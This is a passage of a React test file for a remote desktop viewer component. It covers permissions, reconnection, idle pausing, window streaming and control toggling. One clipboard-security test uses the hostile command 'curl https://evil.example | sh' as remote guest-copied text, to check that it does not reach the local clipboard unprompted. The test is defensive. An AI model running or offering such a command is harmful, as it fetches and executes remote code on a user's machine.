      await vi.waitFor(() => expect(desktopChecks).toHaveLength(2));
      await settle();
      expect(text(container)).toContain("Allow dx to show this Mac");
      expect(text(container)).toContain("System Settings is open on your Mac.");
      expect(FakeSocket.instances).toEqual([]);

      // Allowed: the stream opens by itself; Accessibility alone does not
      // hold it back.
      await React.act(() => vi.advanceTimersByTimeAsync(4_000));
      await connected();
      expect(desktopChecks).toHaveLength(3);
      expect(text(container)).not.toContain("Allow dx to show this Mac");
      vi.useRealTimers();
      await live();
      expect(text(container)).not.toContain("Clicks and typing are off.");
      await React.act(() => root.unmount());
    });

    it("streams at once when only Accessibility is missing", async () => {
      desktopAnswers = [
        {
          desktop: "ready",
          detail: "Clicks and typing are off.",
          permissions: { screenRecording: true, accessibility: false },
          startsViewOnly: true,
        },
      ];
      const { container, root } = await render(
        <DesktopViewer active threadId={threadA} />,
      );
      await connected();
      expect(text(container)).not.toContain("Allow dx to show this Mac");
      expect(desktopChecks).toHaveLength(1);
      await React.act(() => root.unmount());
    });

    it("stops checking once the Desktop leaves the screen", async () => {
      vi.useFakeTimers();
      desktopAnswers = Array.from({ length: 10 }, () => refused(true));
      const { container, root } = await render(
        <DesktopViewer active threadId={threadA} />,
      );
      await vi.waitFor(() =>
        expect(text(container)).toContain("Allow dx to show this Mac"),
      );
      expect(rows(container)).toEqual([
        expect.stringMatching(/^Screen Recording\s*Needed/),
        expect.stringMatching(/^Accessibility\s*Allowed/),
      ]);
      await React.act(() =>
        root.render(
          withQueries(<DesktopViewer active={false} threadId={threadA} />),
        ),
      );
      // The grace minute, then no more checks.
      await React.act(() => vi.advanceTimersByTimeAsync(61_000));
      const checks = desktopChecks.length;
      await React.act(() => vi.advanceTimersByTimeAsync(20_000));
      expect(desktopChecks).toHaveLength(checks);
      await React.act(() => root.unmount());
    });
  });

  it("asks once more when the desktop is still starting, as on an Orb just resumed", async () => {
    desktopAnswers = ["unavailable"];
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    expect(desktopChecks).toHaveLength(2);
    expect(text(container)).not.toContain("The desktop didn't start.");
    expect(button(container, "Retry")).toBeUndefined();
    await React.act(() => root.unmount());
  });

  it("stops retrying sockets Core refuses and says why", async () => {
    vi.useFakeTimers();
    // Ready at first; the desktop then stops, and Core says so.
    desktopAnswers = ["ready", "unavailable", "unavailable"];
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    await vi.waitFor(
      async () => {
        for (const socket of openSockets()) socket.refuse();
        await vi.advanceTimersByTimeAsync(1_000);
        expect(desktopChecks).toHaveLength(3);
      },
      { timeout: 10_000, interval: 5 },
    );
    await settle();
    expect(text(container)).toContain("The desktop didn't start.");
    const attempts = FakeSocket.instances.length;
    expect(attempts).toBeLessThanOrEqual(7);
    await vi.advanceTimersByTimeAsync(60_000);
    expect(FakeSocket.instances).toHaveLength(attempts);
    expect(openSockets()).toEqual([]);

    await React.act(async () => button(container, "Retry")?.click());
    await connected();
    await React.act(() => root.unmount());
  });

  it("signs out on a session-ended close only when the session check agrees", async () => {
    const ended = vi.fn();
    const stop = onSessionEnded(ended);
    browserSession.checks = 0;
    browserSession.current = {
      user: { id: "usr_1", name: "Alice", email: "a@x.test" },
    };
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    const first = await live();
    // #2634: the Orb closed the stream with 4401 while Alice is still signed
    // in. She stays signed in and the viewer reconnects.
    await React.act(async () => {
      first.readyState = FakeSocket.CLOSED;
      first.dispatchEvent(new CloseEvent("close", { code: 4401 }));
    });
    await vi.waitFor(() => expect(browserSession.checks).toBe(1));
    await settle();
    expect(ended).not.toHaveBeenCalled();
    expect(text(container)).toContain("Reconnecting");
    await vi.waitFor(() => expect(openSockets()).toHaveLength(1), {
      timeout: 5_000,
    });

    // Core's own 4401 after her session really ended signs her out.
    browserSession.current = null;
    const second = desktopSocket();
    await React.act(async () => {
      second.open();
      second.readyState = FakeSocket.CLOSED;
      second.dispatchEvent(new CloseEvent("close", { code: 4401 }));
    });
    await vi.waitFor(() => expect(ended).toHaveBeenCalledTimes(1));
    stop();
    await React.act(() => root.unmount());
  });

  it("gives up on sockets that keep failing while Core says ready", async () => {
    vi.useFakeTimers();
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    await vi.waitFor(
      async () => {
        for (const socket of openSockets()) socket.refuse();
        await vi.advanceTimersByTimeAsync(1_000);
        expect(text(container)).toContain("The desktop stopped responding.");
      },
      { timeout: 20_000, interval: 5 },
    );
    // The first check, two recoveries, and the check that gives up.
    expect(desktopChecks).toHaveLength(4);
    const attempts = FakeSocket.instances.length;
    await vi.advanceTimersByTimeAsync(60_000);
    expect(FakeSocket.instances).toHaveLength(attempts);
    expect(desktopChecks).toHaveLength(4);
    await React.act(() => root.unmount());
  });

  it("pauses an untouched desktop after five minutes so the workspace can sleep", async () => {
    vi.useFakeTimers();
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    const socket = await live(true);
    const surface = surfaceOf(container);

    // voxl's pings and the viewer's acknowledgements are not the person's input.
    for (let second = 0; second < 4 * 60; second += 1) {
      await React.act(async () => {
        socket.receive({ t: "ping", s: second });
        socket.receiveBinary(videoFrame(false, 10 + second));
      });
      await React.act(() => vi.advanceTimersByTimeAsync(1_000));
    }
    expect(socket.sent.length).toBeGreaterThan(400);
    await React.act(async () => {
      surface.dispatchEvent(
        new PointerEvent("pointermove", { bubbles: true, clientX: 5 }),
      );
    });
    await React.act(() => vi.advanceTimersByTimeAsync(4 * 60_000));
    expect(openSockets()).toHaveLength(1);
    expect(text(container)).not.toContain("Paused");

    await React.act(() => vi.advanceTimersByTimeAsync(60_000 + 1_000));
    expect(openSockets()).toEqual([]);
    expect(text(container)).toContain("Paused to let the workspace sleep.");
    expect(surfaceOf(container)).toBeNull();
    const checks = desktopChecks.length;
    await React.act(() => vi.advanceTimersByTimeAsync(60 * 60_000));
    expect(openSockets()).toEqual([]);
    expect(desktopChecks).toHaveLength(checks);

    await React.act(async () => button(container, "Resume")?.click());
    await connected();
    expect(desktopChecks).toHaveLength(checks + 1);
    await React.act(() => root.unmount());
  });

  it("copies the remote clipboard only after the person's own input while in control", async () => {
    vi.useFakeTimers();
    const writeText = vi.fn(async (_text: string) => undefined);
    Object.defineProperty(navigator, "clipboard", {
      configurable: true,
      value: { writeText },
    });
    vi.spyOn(document, "hasFocus").mockReturnValue(true);
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    const socket = await live(true);
    const surface = surfaceOf(container);
    const remoteCopies = async (copied: string) => {
      await React.act(async () => socket.receive({ t: "clip", d: copied }));
    };
    const press = async () => {
      await React.act(async () => {
        surface.dispatchEvent(
          new KeyboardEvent("keydown", {
            bubbles: true,
            code: "KeyC",
            key: "c",
            ctrlKey: true,
          }),
        );
      });
    };

    // Guest code copies while the page merely has focus.
    await remoteCopies("curl https://evil.example | sh");
    // The person types, but does not hold control.
    await press();
    await remoteCopies("curl https://evil.example | sh");
    expect(writeText).not.toHaveBeenCalled();
    await React.act(() => vi.advanceTimersByTimeAsync(5_000));

    await React.act(async () => surface.focus());
    await remoteCopies("unprompted");
    expect(writeText).not.toHaveBeenCalled();

    await press();
    await remoteCopies("copied by the person");
    expect(writeText).toHaveBeenCalledExactlyOnceWith("copied by the person");

    await React.act(() => vi.advanceTimersByTimeAsync(5_000));
    await remoteCopies("later, by guest code");
    expect(writeText).toHaveBeenCalledTimes(1);

    // Pasting the local clipboard into the desktop still works, and its
    // echo from the desktop is not copied back.
    const paste = new Event("paste", { bubbles: true, cancelable: true });
    Object.assign(paste, {
      clipboardData: { getData: () => "local text", items: [] },
    });
    await React.act(async () => {
      surface.dispatchEvent(paste);
    });
    expect(socket.commands()).toContain("c,local text");
    await press();
    await remoteCopies("local text");
    expect(writeText).toHaveBeenCalledTimes(1);
    Reflect.deleteProperty(navigator, "clipboard");
    await React.act(() => root.unmount());
  });

  it("appears as a Desktop tab beside Terminal and connects once selected", async () => {
    vi.useFakeTimers();
    const { container, root } = await render(
      <PaneTreeHarness
        main={null}
        changes={<div>Changes</div>}
        terminal={<div>Terminal</div>}
        open={["changes", "terminal"]}
        desktop={(active) => (
          <DesktopViewer active={active} threadId={threadA} />
        )}
      />,
    );
    expect(FakeSocket.instances).toEqual([]);

    // Opened from the pane's Open Tab menu, Desktop joins the tabs after
    // Terminal and connects once shown.
    const openTab = [
      ...container.querySelectorAll<HTMLButtonElement>(
        'button[aria-label="Open Tab"]',
      ),
    ].at(-1);
    await React.act(() => openTab?.click());
    const item = [
      ...document.querySelectorAll<HTMLElement>('[role="menuitem"]'),
    ].find((candidate) => candidate.textContent?.includes("Desktop"));
    await React.act(() => item?.click());
    await React.act(() => vi.advanceTimersByTimeAsync(50));
    const tabs = [...container.querySelectorAll('[role="tab"]')].map(
      (tab) => tab.textContent,
    );
    expect(tabs.slice(tabs.indexOf("Terminal"))).toEqual([
      "Terminal",
      "Desktop",
    ]);
    await connected();

    await React.act(() =>
      container
        .querySelector<HTMLButtonElement>("#thread-view-tab-changes")
        ?.click(),
    );
    expect(openSockets()).toHaveLength(1);
    await React.act(() => vi.advanceTimersByTimeAsync(61_000));
    expect(openSockets()).toEqual([]);
    await React.act(() => root.unmount());
  });

  describe("window mode on a Mac runner", () => {
    const simulator: MacDesktopWindow = {
      id: 7101,
      app: "Simulator",
      bundleId: "com.apple.iphonesimulator",
      title: "iPhone 16 Pro",
      frame: { x: 120, y: 80, w: 402, h: 874 },
      display: 1,
    };
    const emulator: MacDesktopWindow = {
      id: 7102,
      app: "qemu-system-aarch64",
      bundleId: "",
      title: "Android Emulator - Pixel_8:5554",
      frame: { x: 700, y: 60, w: 412, h: 915 },
      display: 1,
    };
    const picker = (container: HTMLElement) =>
      container.querySelector<HTMLElement>(
        '[role="toolbar"][aria-label="Stream a window"]',
      );
    const choice = (container: HTMLElement, label: string) =>
      [...(picker(container)?.querySelectorAll("button") ?? [])].find(
        (candidate) => candidate.getAttribute("aria-label")?.startsWith(label),
      ) as HTMLButtonElement;
    /** The Mac's screen: its hello and a full picture. */
    const liveMac = async (window?: MacDesktopWindow) => {
      const socket = desktopSocket();
      await React.act(async () => {
        socket.open();
        socket.receive(macHello(window));
        for (let index = 0; index < 3; index += 1)
          socket.receiveBinary(videoFrame(index === 0, 1 + index));
      });
      await vi.waitFor(() => expect(draws).toHaveBeenCalled());
      await settle();
      return socket;
    };
    const click = (container: HTMLElement) =>
      React.act(async () => {
        const surface = surfaceOf(container);
        surface.focus();
        for (const type of ["pointerdown", "pointerup"])
          surface.dispatchEvent(
            new PointerEvent(type, {
              bubbles: true,
              button: 0,
              pointerType: "mouse",
              clientX: 20,
              clientY: 20,
            }),
          );
      });
    const buttons = (socket: FakeSocket) =>
      socket.commands().filter((command) => command.startsWith("b,"));

    it("streams the whole screen from another device, and switches to one window and back", async () => {
      macWindows = [simulator, emulator];
      const { container, root } = await render(
        <DesktopViewer active threadId={threadA} />,
      );
      await connected();
      const socket = await liveMac();
      await vi.waitFor(() => expect(picker(container)).not.toBeNull());
      // The Linux app row is not offered on a Mac.
      expect(
        container.querySelector('[role="toolbar"][aria-label="Desktop apps"]'),
      ).toBeNull();
      // Closed: only what streams now.
      const current = choice(container, "Streaming Whole screen");
      expect(current.getAttribute("aria-expanded")).toBe("false");
      await React.act(async () => current.click());
      expect(
        choice(container, "Whole screen").getAttribute("aria-pressed"),
      ).toBe("true");
      expect(
        choice(container, "Simulator — iPhone 16 Pro").getAttribute(
          "aria-pressed",
        ),
      ).toBe("false");
      expect(choice(container, "qemu-system-aarch64 — Android")).toBeDefined();

      // A window: voxl is asked, and its next stream is that window.
      await React.act(async () =>
        choice(container, "Simulator — iPhone 16 Pro").click(),
      );
      expect(socket.commands()).toContain("dw,7101");
      const sent = socket.commands().length;
      await React.act(async () => socket.receive(macHello(simulator)));
      await settle();
      expect(
        choice(container, "Streaming Simulator — iPhone 16 Pro"),
      ).toBeDefined();
      // A window keeps its own size: no resize request for it.
      expect(
        socket
          .commands()
          .slice(sent)
          .filter((command) => command.startsWith("sz,")),
      ).toEqual([]);
      // Control goes on to the window.
      await click(container);
      expect(buttons(socket).length).toBeGreaterThan(0);

      // Back to the whole screen.
      await React.act(async () =>
        choice(container, "Streaming Simulator").click(),
      );
      await React.act(async () => choice(container, "Whole screen").click());
      expect(socket.commands()).toContain("ds,1");
      await React.act(async () => socket.receive(macHello()));
      await settle();
      expect(choice(container, "Streaming Whole screen")).toBeDefined();

      // The streamed window closes: voxl says so and streams the screen.
      await React.act(async () =>
        choice(container, "Streaming Whole screen").click(),
      );
      await React.act(async () =>
        choice(container, "qemu-system-aarch64").click(),
      );
      expect(socket.commands()).toContain("dw,7102");
      await React.act(async () => socket.receive(macHello(emulator)));
      await React.act(async () => {
        socket.receive({ t: "windowClosed", id: 7102 });
        socket.receive(macHello());
      });
      await settle();
      expect(choice(container, "Streaming Whole screen")).toBeDefined();
      await React.act(() => root.unmount());
    });

    it("keeps a Mac's input notice off the stream and tells it when control turns on", async () => {
      const detail =
        "Clicks and typing are off: macOS hasn't allowed dx to control this Mac. Turn on dx in System Settings › Privacy & Security › Accessibility, then reopen the Desktop.";
      desktopAnswers = [{ desktop: "ready", detail, startsViewOnly: true }];
      macWindows = [simulator];
      const { container, root } = await render(
        <DesktopViewer active threadId={threadA} />,
      );
      await connected();
      const socket = await liveMac();
      await vi.waitFor(() =>
        expect(
          picker(container)?.querySelector<HTMLButtonElement>(
            ".desktop-window-control",
          ),
        ).toBeDefined(),
      );
      // Nothing covers the stream.
      expect(text(container)).not.toContain("Accessibility");
      expect(toasts).toEqual([]);
      await React.act(async () =>
        picker(container)
          ?.querySelector<HTMLButtonElement>(".desktop-window-control")
          ?.click(),
      );
      expect(toasts).toEqual([detail]);
      expect(text(container)).not.toContain("Accessibility");
      await React.act(async () => socket.receive(macHello()));
      await React.act(() => root.unmount());
    });

    it("opens view-only, lets windows stream without input, and sends input only while Control is on", async () => {
      // A real Mac someone may be using, maybe the one running this browser.
      desktopAnswers = [{ desktop: "ready", startsViewOnly: true }];
      macWindows = [simulator, emulator];
      const { container, root } = await render(
        <DesktopViewer active threadId={threadA} />,
      );
      await connected();
      const socket = await liveMac();
      await vi.waitFor(() => expect(picker(container)).not.toBeNull());
      const toggle = () =>
        picker(container)?.querySelector<HTMLButtonElement>(
          ".desktop-window-control",
        ) as HTMLButtonElement;
      expect(toggle().getAttribute("aria-pressed")).toBe("false");
      expect(toggle().textContent).toContain("View only");
      // Nothing covers the stream, and a click sends nothing.
      expect(text(container)).not.toContain("Pick a window to stream");
      await click(container);
      expect(buttons(socket)).toEqual([]);

      // Watching a window is allowed; it still sends no input.
      await React.act(async () =>
        choice(container, "Streaming Whole screen").click(),
      );
      await React.act(async () =>
        choice(container, "Simulator — iPhone 16 Pro").click(),
      );
      expect(socket.commands()).toContain("dw,7101");
      await React.act(async () => socket.receive(macHello(simulator)));
      await settle();
      await click(container);
      expect(buttons(socket)).toEqual([]);

      // Control on: clicks reach the Mac.
      await React.act(async () => toggle().click());
      expect(toggle().getAttribute("aria-pressed")).toBe("true");
      expect(toggle().textContent).toContain("Control");
      await click(container);
      const pressed = buttons(socket).length;
      expect(pressed).toBeGreaterThan(0);

      // A new stream (voxl restarted) keeps control on.
      await React.act(async () => socket.receive(macHello(simulator)));
      await settle();
      await click(container);
      expect(buttons(socket).length).toBeGreaterThan(pressed);

      // Control off: whatever is held is released, and input stops.
      const released = socket.commands().filter((c) => c === "r").length;
      await React.act(async () => toggle().click());
      expect(socket.commands().filter((c) => c === "r").length).toBe(
        released + 1,
      );
      const before = buttons(socket).length;
      await click(container);
      expect(buttons(socket)).toHaveLength(before);
      // There is no background input any more.
      expect(socket.commands().some((c) => c.startsWith("db,"))).toBe(false);
      await React.act(() => root.unmount());
    });
  });

  describe("app row", () => {
    const row = (container: HTMLElement) =>
      container.querySelector<HTMLElement>(
        '[role="toolbar"][aria-label="Desktop apps"]',
      );
    const app = (container: HTMLElement, label: string) =>
      [...(row(container)?.querySelectorAll("button") ?? [])].find(
        (candidate) => candidate.textContent?.includes(label),
      ) as HTMLButtonElement;

    it("lists the apps, opens a closed one, and brings an open one forward instead of starting another", async () => {
      desktopWindows = [
        {
          id: 7,
          app: "browser",
          title: "Docs - Chromium",
          minimized: true,
          focused: false,
        },
        { id: 9, title: "Figure 1", minimized: false, focused: true },
      ];
      const { container, root } = await render(
        <DesktopViewer active threadId={threadA} />,
      );
      await connected();
      // Nothing is listed before the desktop shows.
      expect(row(container)).toBeNull();
      expect(windowRequests).toEqual([]);
      await live();
      await vi.waitFor(() => expect(row(container)).not.toBeNull());

      // Above the desktop: Terminal (closed), Chromium (minimized), and the
      // other open window by its title.
      const children = [
        ...(container.querySelector(".thread-desktop-shell")?.children ?? []),
      ];
      expect(children.indexOf(row(container) as Element)).toBeLessThan(
        children.indexOf(surfaceOf(container)),
      );
      expect(app(container, "Terminal").dataset.state).toBe("closed");
      expect(app(container, "Terminal").getAttribute("aria-label")).toBe(
        "Open Terminal",
      );
      expect(app(container, "Chromium").dataset.state).toBe("minimized");
      expect(app(container, "Chromium").getAttribute("aria-label")).toBe(
        "Restore Chromium",
      );
      expect(app(container, "Figure 1").dataset.state).toBe("focused");

      // A closed app starts, shows as open in front, and the keyboard goes
      // on to the desktop.
      await React.act(() => app(container, "Terminal").click());
      await vi.waitFor(() =>
        expect(app(container, "Terminal").dataset.state).toBe("focused"),
      );
      expect(windowRequests.at(-1)).toEqual({
        method: "POST",
        body: { app: "terminal" },
      });
      expect(document.activeElement).toBe(surfaceOf(container));
      expect(app(container, "Figure 1").dataset.state).toBe("open");

      // An open one comes forward; nothing new starts.
      await React.act(() => app(container, "Chromium").click());
      await vi.waitFor(() =>
        expect(app(container, "Chromium").dataset.state).toBe("focused"),
      );
      expect(windowRequests.at(-1)).toEqual({
        method: "POST",
        body: { app: "browser" },
      });
      expect(
        desktopWindows.filter((window) => window.app === "browser"),
      ).toHaveLength(1);

      // Another window comes forward by its ID.
      await React.act(() => app(container, "Figure 1").click());
      await vi.waitFor(() =>
        expect(app(container, "Figure 1").dataset.state).toBe("focused"),
      );
      expect(windowRequests.at(-1)).toEqual({
        method: "POST",
        body: { window: 9 },
      });
      await React.act(() => root.unmount());
    });

    it("notices a window closed on the desktop after a click there", async () => {
      desktopWindows = [
        {
          id: 3,
          app: "terminal",
          title: "xterm",
          minimized: false,
          focused: true,
        },
      ];
      const { container, root } = await render(
        <DesktopViewer active threadId={threadA} />,
      );
      await connected();
      await live();
      await vi.waitFor(() =>
        expect(app(container, "Terminal").dataset.state).toBe("focused"),
      );
      const listed = windowRequests.length;

      // The person clicks the window's close button on the desktop.
      desktopWindows = [];
      await React.act(async () => {
        surfaceOf(container).dispatchEvent(
          new PointerEvent("pointerup", { bubbles: true }),
        );
      });
      await vi.waitFor(() =>
        expect(app(container, "Terminal").dataset.state).toBe("closed"),
      );
      expect(windowRequests.length).toBe(listed + 1);
      expect(windowRequests.at(-1)?.method).toBe("GET");
      await React.act(() => root.unmount());
    });

    it("catches up with apps a desktop that just started opens after its first picture", async () => {
      // A desktop that just started (or woke from a stop) has no windows at
      // its first listing; its Terminal maps a moment later.
      const { container, root } = await render(
        <DesktopViewer active threadId={threadA} />,
      );
      await connected();
      await live();
      await vi.waitFor(() =>
        expect(app(container, "Terminal").dataset.state).toBe("closed"),
      );
      desktopWindows = [
        {
          id: 5,
          app: "terminal",
          title: "xterm",
          minimized: false,
          focused: true,
        },
      ];
      // No input on the desktop, and well before the ten-second poll.
      await vi.waitFor(
        () => expect(app(container, "Terminal").dataset.state).toBe("focused"),
        { timeout: 4_000 },
      );
      await React.act(() => root.unmount());
    });

    it("stays hidden on an Orb whose daemon cannot list windows", async () => {
      windowsAnswer = "unsupported";
      const { container, root } = await render(
        <DesktopViewer active threadId={threadA} />,
      );
      await connected();
      await live();
      await vi.waitFor(() => expect(windowRequests.length).toBeGreaterThan(0));
      await settle();
      expect(row(container)).toBeNull();
      expect(surfaceOf(container)).not.toBeNull();
      await React.act(() => root.unmount());
    });
  });
});
